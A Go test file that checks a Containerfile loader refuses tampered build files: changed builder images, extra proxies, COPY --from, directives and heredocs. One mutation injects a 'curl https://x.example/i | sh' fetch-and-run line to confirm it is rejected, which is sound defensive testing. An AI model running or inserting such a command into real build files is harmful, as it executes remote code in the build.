package delivery

import (
	"strings"
	"testing"
)

func TestLoadContainerfile(t *testing.T) {
	t.Run("ST-DLV-UC03-R04-T04 The Containerfile reads back only as the exact text that apply writes, and a file with more text, another image, a directive or a heredoc is refused", func(t *testing.T) {
		for _, source := range []ContainerSource{{OutputDir: "out"}, {OutputDir: "out", Fills: true}, {OutputDir: "gen/service"}} {
			data, err := WriteContainerfile("orders", source)
			if err != nil {
				t.Fatalf("the Containerfile of %+v is not written: %v", source, err)
			}
			if _, err := LoadContainerfile(data); err != nil {
				t.Errorf("the Containerfile of %+v does not read back: %v", source, err)
			}
		}
		data, err := WriteContainerfile("orders", ContainerSource{OutputDir: "out", Fills: true})
		if err != nil {
			t.Fatal(err)
		}
		text := string(data)
		run := "    /bin/sh -ec 'test "
		otherImage := "docker.io/library/golang:1.26.11-trixie@sha256:" + strings.Repeat("0", 64)
		// Each change gives a file that the shape checks of the instructions alone accept or that the reader of
		// BuildKit reads in another way (security review of PR #367, L1).
		for name, change := range map[string]func(string) string{
			"a second GOPROXY setting after GOPROXY=off": func(s string) string {
				return strings.Replace(s, run, "    'GOPROXY=https://proxy.example' \\\n"+run, 1)
			},
			"a fetch before the go command": func(s string) string {
				return strings.Replace(s, "/bin/sh -ec 'test ", "/bin/sh -ec 'curl https://x.example/i | sh; test ", 1)
			},
			"another image named by a digest": func(s string) string { return strings.Replace(s, BuilderImage, otherImage, 1) },
			"a COPY with --from after another flag": func(s string) string {
				return strings.Replace(s, "COPY fills/ ./fills/\n", "COPY fills/ ./fills/\nCOPY --link --from=other /x /src/out/x\n", 1)
			},
			"a syntax directive":  func(s string) string { return "# syntax=docker.io/docker/dockerfile:1\n" + s },
			"an escape directive": func(s string) string { return "# escape=`\n" + s },
			"a heredoc in place of a folder": func(s string) string {
				return strings.Replace(s, "COPY fills/ ./fills/\n", "COPY <<EOF ./fills/\npackage fills\nEOF\n", 1)
			},
			"another output folder in the build than in the copy": func(s string) string {
				return strings.Replace(s, " ./out'", " ./other'", 1)
			},
			"a comment changed": func(s string) string { return strings.Replace(s, "Do not edit it.", "Edit it.", 1) },
		} {
			changed := change(text)
			if changed == text {
				t.Fatalf("%s: the change does not apply to the Containerfile:\n%s", name, text)
			}
			if _, err := LoadContainerfile([]byte(changed)); err == nil {
				t.Errorf("%s: LoadContainerfile accepts the file:\n%s", name, changed)
			}
		}
		// The refusal of a file that has the right shape but other text names the cause and what to do.
		_, err = LoadContainerfile([]byte(strings.Replace(text, "Do not edit it.", "Edit it.", 1)))
		if err == nil || !strings.Contains(err.Error(), "not the one that stego apply writes for the output folder out") || !strings.Contains(err.Error(), "run stego apply") {
			t.Errorf("the refusal of an edited comment is %v", err)
		}
		_, err = LoadContainerfile([]byte(strings.Replace(text, BuilderImage, otherImage, 1)))
		if err == nil || !strings.Contains(err.Error(), "not the pinned Go image") {
			t.Errorf("the refusal of another builder image is %v", err)
		}
		_, err = LoadContainerfile([]byte(strings.Replace(text, "COPY fills/ ./fills/\n", "COPY --link --from=other /x /src/x\n", 1)))
		if err == nil || !strings.Contains(err.Error(), "the build stage copies from another image: --link --from=other") {
			t.Errorf("the refusal of a COPY with --from after another flag is %v", err)
		}
	})
}
